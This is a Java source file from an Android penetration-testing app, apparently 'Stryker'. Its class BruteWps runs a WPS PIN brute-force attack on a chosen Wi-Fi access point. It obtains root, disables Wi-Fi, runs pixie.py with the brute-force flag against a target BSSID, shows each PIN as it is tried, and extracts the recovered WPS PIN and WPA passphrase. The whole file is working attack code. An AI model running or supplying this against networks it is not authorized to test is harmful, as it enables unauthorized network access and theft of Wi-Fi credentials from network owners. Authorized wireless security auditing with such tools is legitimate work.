package com.zalexdev.stryker.wifi.utils;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;

import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFiNetwork;
import com.zalexdev.stryker.utils.Core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This class is used to run the wps brute attack
 */
public class BruteWps extends AsyncTask<Void, String, WiFiNetwork> {
    public String exec = Core.EXECUTE;
    public String chroot;
    public Activity mActivity;
    public TextView prog;
    public String bssid;
    public Process process;
    public String wlan;
    public Core core;
    public boolean canceled = false;


    public BruteWps(Activity activity, TextView per, String b, String w, Core c) {
        mActivity = activity;
        prog = per;
        bssid = b;
        core = c;
        wlan = w;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();

    }

    @SuppressLint("WrongThread")
    @Override
    protected WiFiNetwork doInBackground(Void... command) {
        String line;
        WiFiNetwork result = new WiFiNetwork();

        try {
            process = Runtime.getRuntime().exec("su -mm");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + wlan + " --iface-down -B -b " + bssid;
            if (core.getBoolean("pixie_off")) {
                cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + wlan + " -B -b " + bssid;
                stdin.write(("" + exec + "'" + cmd + "'" + " &&echo BRUTEFINISHED" + '\n').getBytes());

            } else {
                stdin.write(("svc wifi disable&&sleep 2&&" + exec + "'" + cmd + "'" + " &&echo BRUTEFINISHED&&sleep 2&&svc wifi enable" + '\n').getBytes());
            }
            stdin.write(("exit\n").getBytes());
            stdin.flush();
            stdin.close();

            ArrayList<String> out = new ArrayList<>();
            ArrayList<String> outerror = new ArrayList<>();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            String per = "0%";
            String spe = core.str("pinss");
            String pin = "00000000";
            while ((line = br.readLine()) != null) {
                out.add(line);
                if (line.contains("% complete")) {
                    per = getPercent(line);
                    spe = getSpeed(line);
                } else if (line.contains("Trying PIN")) {
                    pin = getPincode(line);

                } else if (line.contains("BRUTEFINISHED")) {
                    result = issuccess(out);
                }
                setText(core.str("prog") + per +"\n"+ core.str("speedd")+spe+"\n"+ core.str("piin") + pin, prog);
            }
            br.close();
            br = new BufferedReader(new InputStreamReader(stderr));
            while ((line = br.readLine()) != null) {
                onProgressUpdate(line);
                outerror.add(line);
            }
            core.writetolog(out, false);
            core.writetolog(outerror, true);
            br.close();
            process.waitFor();
            process.destroy();
        } catch (IOException e) {
            Log.d(TAG, "An IOException was caught: " + e.getMessage());
        } catch (InterruptedException ex) {
            Log.d(TAG, "An InterruptedException was caught: " + ex.getMessage());
        }
        if (canceled) {
            result.setCanceled(true);
        }
        return result;
    }

    @Override
    protected void onPostExecute(WiFiNetwork result) {

        super.onPostExecute(result);
    }

    @Override
    protected void onProgressUpdate(String... values) {
        super.onProgressUpdate(values);

    }

    public WiFiNetwork issuccess(ArrayList<String> out) {
        String pin;
        String pass;

        WiFiNetwork back = new WiFiNetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        if (out.isEmpty()) {
            back.setCanceled(true);
        }
        return back;
    }

    public void kill() {
        canceled = true;
        process.destroy();

    }

    public void setText(String text, TextView textView) {
        mActivity.runOnUiThread(() -> textView.setText(text));
    }

    public String getPercent(final String input) {
        String result = "";
        Matcher matcher = Pattern.compile("\\d+\\.\\d+%").matcher(input);
        if (matcher.find()) {
            result = matcher.group(0);
        }
        return result + "/100%";
    }

    public String getSpeed(final String input) {
        String result = "";
        Matcher matcher = Pattern.compile("\\d+\\.\\d+ seconds").matcher(input);
        if (matcher.find()) {
            result = matcher.group(0);
        }
        assert result != null;
        return result.replace("seconds", mActivity.getString(R.string.spin));

    }

    public String getPincode(final String input) {
        String result = "";
        Matcher matcher = Pattern.compile("\\d+").matcher(input);
        if (matcher.find()) {
            result = matcher.group(0);
        }

        return mActivity.getString(R.string.now) + result;
    }


}
